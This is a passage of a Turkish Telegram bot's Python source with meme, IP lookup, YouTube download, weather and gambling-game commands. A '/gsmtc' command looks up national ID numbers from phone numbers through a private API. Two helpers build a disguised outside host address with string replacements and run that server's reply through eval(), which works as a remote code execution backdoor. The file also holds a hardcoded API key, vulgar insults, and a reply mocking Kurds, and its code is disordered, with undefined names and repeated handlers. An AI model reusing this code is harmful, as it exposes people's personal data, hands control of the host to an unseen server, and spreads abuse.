        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ["member", "administrator"]
    except Exception as e:
        print(f"Hata: {e}")
        return False

import telebot
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests









@bot.message_handler(commands=['meme'])
def add_text_to_image(message):
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002245175746
    group_id = -1002228388312

  
    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @BotAltyapi\nChat: @BotAltyapiChat"
        bot.send_message(message.chat.id, response)
        return
    
    text = message.text.replace('/meme ', '')  

    try:
       
        image = Image.open("a.png")

        draw = ImageDraw.Draw(image)

        position = (380, 380)  

        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()  # Font indirme hatası için kontrol ekliyoruz
        font = ImageFont.truetype(BytesIO(font_response.content), size=50)  

        draw.text(position, text, (160, 100, 50), font=font, spacing=10, align="center")  

        shadow_position = (position[0] + 1, position[1] + 1)  
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=10, align="center")  
        
        blurred_image = image.filter(ImageFilter.GaussianBlur(radius=1.8))

       
        buffered = BytesIO()
        blurred_image.save(buffered, format="JPEG")  
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: {err}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: {e}")







@bot.message_handler(commands=['meme1'])
def add_text_to_image(message):
    

    text = message.text.replace('/meme1 ', '')

    try:
        image = Image.open("c.png").convert('RGBA')

     
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=55)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)


        position = (300, 460)
        shadow_position = (position[0] + 1, position[1] + 1)

       
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=20, align="center")

       
        draw.text(position, text, (50, 50, 50), font=font, spacing=20, align="center")

       
        rotated_text_image = text_image.rotate(-13,resample=Image.BICUBIC, expand=1)

     
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

    
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

     
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

      
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.5))

      
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")
        



@bot.message_handler(commands=['meme2'])
def add_text_to_image(message):
    

    text = message.text.replace('/meme2 ', '')

    try:
        image = Image.open("d.png").convert('RGBA')

     
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=46)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)


        position = (340, 820)
        shadow_position = (position[0] + 1, position[1] + 1)

       
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=100, align="center")

       
        draw.text(position, text, (50, 50, 50), font=font, spacing=100, align="center")

       
        rotated_text_image = text_image.rotate(-7,resample=Image.BICUBIC, expand=1)

     
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

    
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

     
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

      
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.1))

      
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")

@bot.message_handler(commands=['meme3'])
def add_text_to_image(message):
    

    text = message.text.replace('/meme3 ', '')

    try:
        image = Image.open("y.png").convert('RGBA')

     
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=46)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)


        position = (480, 240)
        shadow_position = (position[0] + 1, position[1] + 1)

       
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=100, align="center")

       
        draw.text(position, text, (50, 50, 50), font=font, spacing=100, align="center")

       
        rotated_text_image = text_image.rotate(-7,resample=Image.BICUBIC, expand=1)

     
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

    
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

     
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

      
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.1))

      
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")








@bot.message_handler(commands=['p'])
def handle_ip_command(message):
    try:
        ip_address = message.text.split()[1]
        response = requests.get(f'https://tsgchecker.tsgmods.com.tr/yunus/ip.php?ip={ip_address}')
        data = response.json()
        
        if data['status'] == 'success':
            ip_info = (
                f"IP Bilgileri:\n"
                f"Ülke: {data['country']} ({data['countryCode']})\n"
                f"Bölge: {data['regionName']} ({data['region']})\n"
                f"Şehir: {data['city']}\n"
                f"Posta Kodu: {data['zip']}\n"
                f"Enlem: {data['lat']}\n"
                f"Boylam: {data['lon']}\n"
                f"Saat Dilimi: {data['timezone']}\n"
                f"ISP: {data['isp']}\n"
                f"Organizasyon: {data['org']}\n"
                f"AS: {data['as']}\n"
                f"Sorgulanan IP: {data['query']}"
            )
        else:
            ip_info = "Geçersiz IP adresi veya bilgi alınamıyor."

        bot.reply_to(message, ip_info)
    except IndexError:
        bot.reply_to(message, "Lütfen bir IP adresi girin. Örnek: /ip 1.1.1.1")
    except Exception as e:
        bot.reply_to(message, f"Böyle Bir İp Adresi Bulunamadı.")


@bot.message_handler(commands=['got'])
def add_text_to_image(message):
    

    text = message.text.replace('/got ', '')

    try:
        image = Image.open("b.png").convert('RGBA')

     
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=46)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)


        position = (100, 350)
        shadow_position = (position[0] + 1, position[1] + 1)

       
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=100, align="center")

       
        draw.text(position, text, (50, 50, 50), font=font, spacing=100, align="center")

       
        rotated_text_image = text_image.rotate(-7,resample=Image.BICUBIC, expand=1)

     
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

    
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

     
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

      
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.1))

      
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")



@bot.message_handler(commands=['got1'])
def add_text_to_image(message):
    

    text = message.text.replace('/got1 ', '')

    try:
        image = Image.open("ay.png").convert('RGBA')

     
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=46)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)


        position = (160, 600)
        shadow_position = (position[0] + 1, position[1] + 1)

       
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=100, align="center")

       
        draw.text(position, text, (50, 50, 50), font=font, spacing=100, align="center")

       
        rotated_text_image = text_image.rotate(-7,resample=Image.BICUBIC, expand=1)

     
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

    
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

     
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

      
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.1))

      
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")





from youtube_search import YoutubeSearch
from pytube import YouTube
import telebot


def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False






def sanitize_filename(name):
    return re.sub(r'[\\/*?:"<>|]', "", name)

@bot.message_handler(commands=['muzik'])
def download_music(message):
    query = " ".join(message.text.split()[1:])
    if not query:
        bot.reply_to(message, "Lütfen müzik adı veya YouTube linki girin. Örnek kullanım: /muzik şarkı adı")
        return

    try:
        results = YoutubeSearch(query, max_results=1).to_dict()
    except Exception as e:
        bot.reply_to(message, f"Arama sırasında hata oluştu: {e}")
        return

    if results and len(results) > 0:
        video_url = 'https://www.youtube.com' + results[0]['url_suffix']
        bot.reply_to(message, f"Müzik indiriliyor: {video_url}")

        try:
            yt = YouTube(video_url)
            if yt.age_restricted:
                bot.reply_to(message, "Bu video yaş sınırlamalı ve indirilemiyor. Lütfen başka bir video seçin.")
                return

            audio_stream = yt.streams.filter(only_audio=True).first()
            if audio_stream:
                sanitized_title = sanitize_filename(yt.title)
                audio_path = audio_stream.download(output_path=".", filename=sanitized_title + ".mp3")

             
                log_chat_id = -1002228388312 

                
                channel_username = "BotAltyapi"  
                join_channel_text = "Kanalımıza katılın"
                join_channel_link = f"https://t.me/{channel_username}"
                keyboard = types.InlineKeyboardMarkup()
                url_button = types.InlineKeyboardButton(text=join_channel_text, url=join_channel_link)
                keyboard.add(url_button)

              
                with open(audio_path, 'rb') as audio:
                    bot.send_audio(log_chat_id, audio, caption=f"{yt.title}\nMüziği indiren: @{message.from_user.username}", reply_markup=keyboard)

              
                channel_username = "BotAltyapiMuzik"  # Kanalın kullanıcı adını buraya yaz
                join_channel_text = "Müzik kanalı"
                join_channel_link = f"https://t.me/{channel_username}"
                keyboard = types.InlineKeyboardMarkup()
                url_button = types.InlineKeyboardButton(text=join_channel_text, url=join_channel_link)
                keyboard.add(url_button)

                with open(audio_path, 'rb') as audio:
                    bot.send_audio(message.chat.id, audio, caption=f"{yt.title}\nMüziği indiren: @{message.from_user.username}", reply_markup=keyboard)
                os.remove(audio_path)  # İndirilen dosyayı sil
            else:
                bot.reply_to(message, "Uygun bir ses akışı bulunamadı.")
        except Exception as e:
            bot.reply_to(message, f"Müzik indirilemedi. Hata: {e}")
    else:
        bot.reply_to(message, "Müzik bulunamadı veya YouTube arama sonucu boş.")

@bot.message_handler(commands=['video'])
def download_video(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    query = " ".join(message.text.split()[1:])
    if not query:
        bot.reply_to(message, "Lütfen video adı veya YouTube linki girin. Örnek kullanım: /video video adı")
        return

    try:
        results = YoutubeSearch(query, max_results=1).to_dict()
    except Exception as e:
        bot.reply_to(message, f"Arama sırasında hata oluştu: {e}")
        return

    if results and len(results) > 0:
        video_url = 'https://www.youtube.com' + results[0]['url_suffix']
        bot.reply_to(message, f"Video indiriliyor: {video_url}")

        try:
            yt = YouTube(video_url)
            if yt.age_restricted:
                bot.reply_to(message, "Bu video yaş sınırlamalı ve indirilemiyor. Lütfen başka bir video seçin.")
                return

            video_stream = yt.streams.filter(progressive=True, file_extension='mp4').first()
            if video_stream:
                sanitized_title = sanitize_filename(yt.title)
                video_path = video_stream.download(output_path=".", filename=sanitized_title + ".mp4")

                with open(video_path, 'rb') as video:
                    bot.send_video(message.chat.id, video, caption=f"{yt.title}\n@TSGChecker", supports_streaming=True)

                os.remove(video_path)
            else:
                bot.reply_to(message, "Uygun bir video akışı bulunamadı.")
        except Exception as e:
            bot.reply_to(message, f"Video indirilemedi. Hata: {e}")
    else:
        bot.reply_to(message, "Video bulunamadı veya YouTube arama sonucu boş.")


@bot.message_handler(commands=['discordid'])
def handle_discordid_command(message):
    try:
        command_params = message.text.split(maxsplit=1)
        if len(command_params) > 1:
            discord_id = command_params[1]
            bot.send_message(message.chat.id, 'Bilgiler getiriliyor, lütfen bekleyin...')
            fetch_and_send_discord_info(message.chat.id, discord_id)
        else:
            bot.send_message(message.chat.id, 'Lütfen bir Discord ID\'si belirtin.')
    except Exception as e:
        bot.send_message(message.chat.id, f'Komut işlenirken bir hata oluştu: {e}')

def fetch_and_send_discord_info(chat_id, discord_id):
    try:
        api_url = f'https://tilki.dev/api/discord-id-sorgu/{discord_id}'
        response = requests.get(api_url)
        
        if response.status_code == 200:
            data = response.json()
            discord_info = (
                f"Kullanıcı Adı: {data['username']}\n"
                f"Durum: {data['durum']}\n"
                f"Durum Yazısı: {data['durum_yazi']}\n"
                f"Rozetler: {', '.join(data['badges'])}\n"
                f"Tag: {data['tag']}\n"
                f"Oluşturma Tarihi: {data['olusturma_tarihi']}\n"
                f"Bot mu: {'Evet' if data['botmu'] else 'Hayır'}\n"
                f"Avatar URL: {data['avatarUrl']}"
            )
            bot.send_message(chat_id, discord_info)
        else:
            bot.send_message(chat_id, f'Bilgiler getirilirken bir hata oluştu: {response.status_code}')
    except Exception as e:
        bot.send_message(chat_id, f'Bilgiler getirilirken bir hata oluştu: {e}')



  
@bot.message_handler(commands=['cm'])
def send_random_number(message):
    
    
    
    random_number = random.randint(1, 40)
    bot.reply_to(message, f"ÇAVUŞUN BOYU: {random_number} cm")





GSRTC_API = "http://localhost/yunus/gsmtc.php?gsm="


@bot.message_handler(commands=['gsmtc'])
def handle_gsmtc(message):
    
        
   
    try:
        # Extract GSM number from the command
        gsm_number = message.text.split()[1]

        
        api_response = requests.get(GSRTC_API + gsm_number).json()

        
        if api_response.get("success") == "true" and api_response.get("number") > 0:
            data = api_response.get("data")
            
            
            result_text = "╭━━━━━━━━━━━━━╮\n"
            for entry in data:
                tc = entry.get("TC")
                gsm = entry.get("GSM")
                result_text += f"┃➥ GSM: {gsm}\n┃➥ TC: {tc}\n╰━━━━━━━━━━━━━╯\n"

            
            bot.send_message(message.chat.id, result_text)
        else:
            bot.send_message(message.chat.id, "Data bulunamadı.")
    except IndexError:
        bot.send_message(message.chat.id, "Lütfen geçerli bir GSM numarası girin Başında 0 Olmadan.")


@bot.message_handler(commands=['mute'])
def handle_mute(message):
    """
    '/mute' komutunu işler ve yanıtlanan mesajın gönderenini susturur.
    """
    try:
        chat_member = bot.get_chat_member(message.chat.id, message.from_user.id)
        if chat_member.status in ("administrator", "creator"):
            reply_to = message.reply_to_message
            if reply_to is not None:
                mute_yapilacak_kullanici_id = reply_to.from_user.id
                
                bot.restrict_chat_member(
                    chat_id=message.chat.id,
                    user_id=mute_yapilacak_kullanici_id,
                    can_send_messages=False,
                    can_send_media_messages=False,
                    can_send_polls=False,
                    can_send_other_messages=False,
                    can_add_web_page_previews=False
                )
                bot.send_message(message.chat.id, f"{reply_to.from_user.username} susturuldu.")
            else:
                bot.send_message(message.chat.id, "Lütfen bir mesajı yanıtlayarak /mute komutunu kullanın.")
        else:
            bot.send_message(message.chat.id, "Bu komutu kullanmak için kanal yöneticisi olmanız gerekiyor.")
    except telebot.apihelper.ApiException as e:
        print(f"Kullanıcıyı susturma sırasında hata oluştu: {e}")
        bot.send_message(message.chat.id, f"Kullanıcıyı sustururken bir hata oluştu. Lütfen daha sonra tekrar deneyin.")
        

@bot.message_handler(commands=['unadmin'])
def handle_admin(message):
    
    
    
    """
    '/admin' komutunu işler ve yanıtlanan mesajın gönderenini chat yöneticisi yapar.
    """
    try:
       
        chat_member = bot.get_chat_member(message.chat.id, message.from_user.id)
        if chat_member.status == "creator":
          
            reply_to = message.reply_to_message
            if reply_to is not None:
               
                admin_yapilacak_kullanici_id = reply_to.from_user.id
                
                bot.promote_chat_member(
                    chat_id=message.chat.id,
                    user_id=admin_yapilacak_kullanici_id,
                    can_change_info=False, 
                    can_delete_messages=False,  
                    can_invite_users=False,  
                    can_restrict_members=False, 
                    can_pin_messages=False, 
                    can_promote_members=False  
                )
                bot.send_message(message.chat.id, f"{reply_to.from_user.username} yetkisi alındı.")
            else:
                bot.send_message(message.chat.id, "Lütfen bir mesajı yanıtlayarak /unadmin komutunu kullanın.")
        else:
            bot.send_message(message.chat.id, "Bu komutu kullanmak için kanal kurucusu olmanız gerekiyor.")

    except telebot.apihelper.ApiException as e:
       
        print(f"Yönetici yapma sırasında hata oluştu: {e}")
        bot.send_message(message.chat.id, f"Kullanıcıyı yöneticilikten kaldırırken bir hata oluştu. Lütfen daha sonra tekrar deneyin.")

      



def load_images():
    try:
        with open('images.json', 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def save_images(data):
    with open('images.json', 'w') as f:
        json.dump(data, f, indent=4)


channel_images = load_images()



def load_info():
    try:
        with open('totalinfo.json', 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {'total_channels': 0, 'total_users': 0}


def save_info(data):
    with open('totalinfo.json', 'w') as f:
        json.dump(data, f, indent=4)


total_info = load_info()

# Bot başlatıldığında veya yeniden başlatıldığında çalıştırılacak işlev
def bot_started():
    total_info['total_channels'] = len(bot.get_updates())
    save_info(total_info)
    return f"Bot başlatıldı! Toplam {total_info['total_channels']} kanalda aktif."

# Yeni kanala eklendiğinde veya çıkarıldığında çalıştırılacak işlev
@bot.message_handler(content_types=['new_chat_members', 'left_chat_member'])
def handle_channel_update(message):
    chat_id = message.chat.id
    total_info['total_channels'] = len(bot.get_updates())
    save_info(total_info)

# Toplam kanal sayısını gösteren komut
@bot.message_handler(commands=['toplamkanal'])
def get_total_channels(message):
    chat_id = message.chat.id
    bot.send_message(chat_id=chat_id, text=f"Botun eklendiği toplam kanal sayısı: {total_info['total_channels']}")

# Toplam kullanıcı sayısını gösteren komut
@bot.message_handler(commands=['toplamkullanıcı'])
def get_total_users(message):
    chat_id = message.chat.id
    bot.send_message(chat_id=chat_id, text=f"Toplam Mesaj sayısı: {total_info['total_users']}")

# Yeni mesaj geldiğinde kullanıcı sayısını güncelle
@bot.message_handler(func=lambda message: True)
def track_user_activity(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    # Kullanıcı sayısını güncelle
    total_info['total_users'] += 1
    save_info(total_info)


def save_user(id):
  id = str(id)
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/save", params={'user': id})
  return r.text

def get_users():
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/get")
  return eval(r.text)

def load_balances():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        json.dump(user_balances, f)

user_balances = load_balances()

def block_user(user_id):
    current_time = time.time()
    last_message_times[user_id] = current_time + FLOOD_TIMEOUT

def check_flood(user_id):
    current_time = time.time()
    if user_id in last_message_times:
        message_times = last_message_times[user_id]
        recent_messages = [t for t in message_times if t > current_time - FLOOD_TIMEOUT]
        last_message_times[user_id] = recent_messages
        if len(recent_messages) >= MAX_MESSAGES:
            return True
    return False

def log_message(user_id):
    current_time = time.time()
    if user_id not in last_message_times:
        last_message_times[user_id] = []
    last_message_times[user_id].append(current_time)

headers = {
    'authority': 'api.aichatos.cloud',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/json',
    'origin': 'https://chat.yqcloud.top',
    'referer': 'https://chat.yqcloud.top/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

def ramazan(botaltyapi):
    url = f'https://chatgpt.apinepdev.workers.dev/?question={botaltyapi}'
    response = requests.get(url).json()
    return response['answer']

@bot.message_handler(commands=['gpt'])
def ramazanozturk(message):
    botaltyapi = message.text.replace('/gpt', '').strip()
    
    if not botaltyapi:
        bot.send_message(message.chat.id, "Merhaba ben @BotAltyapi Ekibi Tarafından tasarlandım")
        return
    
    response = ramazan(botaltyapi)
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['toplam'])
def toplam(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Toplam {len(users)} tane.")

def jesus_yarragimi_ye(chat_id, ramazan: str) -> None:
    api_anahtari = '79d1ca96933b0328e1c7e3e7a26cb347'
    temel_url = 'https://api.openweathermap.org/data/2.5/weather'
    umut_kokle = {
        'q': ramazan,  
        'units': 'metric',  
        'lang': 'tr',  
        'appid': api_anahtari 
    }

    try:
        bot_altyapi = requests.get(temel_url, params=umut_kokle)
        bot_altyapi.raise_for_status()
        wexzo_gotten = bot_altyapi.json()

        durum = wexzo_gotten['weather'][0]['description']
        sicaklik = wexzo_gotten['main']['temp']
        en_yuksek_sicaklik = wexzo_gotten['main']['temp_max']
        en_dusuk_sicaklik = wexzo_gotten['main']['temp_min']
        nem_orani = wexzo_gotten['main']['humidity']
        ruzgar_hizi = wexzo_gotten['wind']['speed']

        mesaj = (
            f"Hava Durumu Bilgileri - {ramazan} 🏙️\n"
            f"☁️ Durum: {durum}\n"
            f"☀️ Sıcaklık: {sicaklik}°C\n"
            f"☀️ En Yüksek Sıcaklık: {en_yuksek_sicaklik}°C\n"
            f"🌧️ En Düşük Sıcaklık: {en_dusuk_sicaklik}°C\n"
            f"🌧️ Nem Oranı: {nem_orani}%\n"
            f"🌬️ Rüzgar Hızı: {ruzgar_hizi} m/s"
        )

        bot.send_message(chat_id, mesaj)

    except requests.RequestException as hata:
        print(f'API isteği sırasında bir hata oluştu: {hata}')
        bot.send_message(chat_id, f'Kürdistan diye bir yer yok')
    except KeyError:
        print(f'{ramazan} Yokki')

@bot.message_handler(commands=['va'])
def oclar(message):
    try:
        sehir = message.text.split(' ', 1)[1]
        chat_id = message.chat.id 
        jesus_yarragimi_ye(chat_id, sehir)
    except IndexError:
        bot.reply_to(message, "Şehir adı yaz Hayalistan hariç")

@bot.message_handler(commands=['broadcast'])
def brd(message):
  save_user(message.from_user.id)
  t = Thread(target=broadcast, args=(message,))
  t.start();
  
def broadcast(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Başlatılıyor... (Toplam {len(users)})")
  for user in users:
    try:
      bot.send_message(user, " ".join(message.text.split()[1:]), disable_web_page_preview=True)
      time.sleep(1)
    except Exception as e:
      bot.reply_to(message, f"**{user} kullanıcısına gönderilemedi.** \n\n `{e}`", parse_mode="Markdown")
      time.sleep(1)
  bot.reply_to(message, "Gönderim tamamlandı!")

@bot.message_handler(commands=['puan'])
def puan(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanmaya yetkiniz yok.')
        return
    
    try:
        s = message.text.split()
        if len(s) < 3:
            return bot.reply_to(message, "Kullanım: /puan <kullanıcı_id> <puan>")
        
        id = str(s[1])
        puan = int(s[2])
        user_balances[id] = puan
        save_balances()
        bot.reply_to(message, f"{id} kullanıcısının puanı {puan} olarak değiştirildi.")
    except ValueError:
        bot.reply_to(message, "Geçersiz puan değeri. Lütfen bir sayı girin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")

  
@bot.message_handler(commands=['kaldir'])
def unblock_user(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Ananı sikerim yetkin olmadığı şeye dokunma.')
        return

    try:
        parts = message.text.split()
        target_id = parts[1]
    except IndexError:
        bot.reply_to(message, 'anasini sikmek istediğini kişinin ID\'si gir. böyle kullan oc: /kaldir <kullanıcı_id>')
        return

    if target_id in last_message_times:
        del last_message_times[target_id]
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli kaldırıldı.')
    else:
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli bulunmuyor.')
        
@bot.message_handler(commands=['bakiye'])
def check_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    bot.reply_to(message, f"Güncel bakiyeniz: {user_balances[user_id]} TL")
        
@bot.message_handler(commands=['risk'])
def risk_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if check_flood(user_id):
        bot.reply_to(message, "5 Saniye bekle tekrar at.")
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Risk Alıp Bakiye kazan\nKullanım: /risk <miktar>')
        return

    try:
        
        risk_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'geçerli bir risk miktarı gir Kullanım: /risk <miktar>')
        return

    if risk_amount <= 0:
        bot.reply_to(message, 'Risk miktarı sayı olmalı.')
        return

    if user_balances[user_id] < risk_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    if random.random() < 0.6:  
        winnings = risk_amount * 2
        user_balances[user_id] += winnings - risk_amount  
        bot.reply_to(message, f'Tebrikler  {winnings} TL kazandınız.\nYeni bakiyeniz: {user_balances[user_id]} TL')
    else:
        user_balances[user_id] -= risk_amount
        bot.reply_to(message, f'Üzgünüm {risk_amount} TL kaybettiniz.\nbakiyeniz: {user_balances[user_id]} TL')

        save_balances()

@bot.message_handler(commands=['borc'])
def send_balance_to_friend(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 Saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    try:
        parts = message.text.split()
        friend_id = parts[1]
        amount = int(parts[2])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Geçerli bir miktar girin Kullanım: /borc <kullanıcı_id> <miktar>')
        return

    if amount <= 0:
        bot.reply_to(message, 'Sayı girin')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    if user_balances[user_id] < amount:
        bot.reply_to(message, 'Yeterli bakiyeniz yok.')
        return

    if friend_id not in user_balances:
        user_balances[friend_id] = 0

    user_balances[user_id] -= amount
    user_balances[friend_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {friend_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi.')
    
def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
